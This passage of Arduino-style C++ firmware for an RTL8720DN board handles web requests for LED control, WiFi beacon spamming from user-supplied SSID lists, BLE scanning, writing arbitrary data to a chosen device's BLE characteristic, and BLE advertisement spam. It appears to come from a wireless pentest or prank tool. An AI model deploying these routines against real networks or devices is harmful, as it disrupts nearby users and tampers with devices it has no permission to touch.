      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_enable") {
      led = true;
      digitalWrite(LED_R, HIGH);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/led_disable") {
      led = false;
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    } else if (path == "/spam") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      spam_ssids.clear();
      for (auto &param : post_data) {
        if (param.first == "ssids") {
          String ssids_raw = param.second;
          ssids_raw.replace("%0D", ""); // Loại bỏ carriage return
          int start = 0;
          int end = ssids_raw.indexOf("%0A"); // Tách theo line feed
          while (end != -1) {
            String s = ssids_raw.substring(start, end);
            s.replace("+", " ");
            s.trim();
            if (s.length() > 0) spam_ssids.push_back(s);
            start = end + 3;
            end = ssids_raw.indexOf("%0A", start);
          }
          String s = ssids_raw.substring(start);
          s.replace("+", " ");
          s.trim();
          if (s.length() > 0) spam_ssids.push_back(s);
        } else if (param.first == "count") {
          int count = String(param.second).toInt();
          beacons_per_ssid = (count > 0) ? count : 3;
        }
      }
      if (!spam_ssids.empty()) {
        isSpamming = true;
        Spammer.clearSSIDs();
        for (const String& s : spam_ssids) {
            for (int i = 0; i < beacons_per_ssid; i++) {
                Spammer.addSSID(s);
            }
        }
        
        server.stop();
        wifi_off();
        delay(100);
        wifi_on(RTW_MODE_STA);
        delay(100);
        
        Spammer.start();
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/blescan") {
      BLE.init();
      BLE.beginCentral(1);
      BLE.setScanCallback(bleScanCallback);
      ble_results.clear();
      BLE.configScan()->startScan(3000);
      delay(3500); 
      client.write(makeRedirect("/").c_str());
    } else if (path == "/blewrite") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      String mac, service_uuid, char_uuid, hex_data;
      for (auto &param : post_data) {
          if (param.first == "mac") mac = param.second;
          else if (param.first == "service") service_uuid = param.second;
          else if (param.first == "char") char_uuid = param.second;
          else if (param.first == "data") hex_data = param.second;
      }
      
      if (mac.length() > 0 && hex_data.length() > 0) {
          BLE.init();
          BLE.beginCentral(1);
          // AmebaD kết nối qua configConnection
          if (BLE.configConnection()->connect((char*)mac.c_str(), GAP_REMOTE_ADDR_LE_PUBLIC, 2000)) {
              BLEClient* pClient = BLE.addClient(0); 
              pClient->discoverServices();
              unsigned long start = millis();
              while(!pClient->discoveryDone() && millis() - start < 5000) delay(100);
              
              BLERemoteService* pService = pClient->getService(service_uuid.c_str());
              if (pService != nullptr) {
                  BLERemoteCharacteristic* pChar = pService->getCharacteristic(char_uuid.c_str());
                  if (pChar != nullptr) {
                      int len = hex_data.length() / 2;
                      if (len > 0) {
                          uint8_t val[len];
                          for (int i = 0; i < len; i++) {
                              String part = hex_data.substring(i*2, i*2+2);
                              val[i] = (uint8_t) strtol(part.c_str(), NULL, 16);
                          }
                          pChar->setData(val, len);
                      }
                  }
              }
              BLE.configConnection()->disconnect(0);
          }
      }
      client.write(makeRedirect("/").c_str());
    } else if (path == "/blespam") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
          if (param.first == "type") bleSpamType = String(param.second).toInt();
      }
      isBLESpamming = true;
      
      // CRITICAL: Do NOT call wifi_off() before BLE!
      // BLE.init() has a blocking while-loop: while(!wifi_is_up()) { hang; }
      // Calling wifi_off() first causes INFINITE HANG in BLE.init().
      // RTL8720DN supports WiFi+BLE coexistence via bt_coex_init() in beginPeripheral().
      // We only stop the web server so the loop() can enter the BLE block.
      server.stop();
      delay(50);
      
      client.write(makeRedirect("/").c_str());
      client.stop();
      goto end_request;
    } else if (path == "/refresh") {
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    if (led) {
      digitalWrite(LED_G, LOW);
    }
end_request:;
  }
  
  wext_set_channel(WLAN0_NAME, current_channel);
}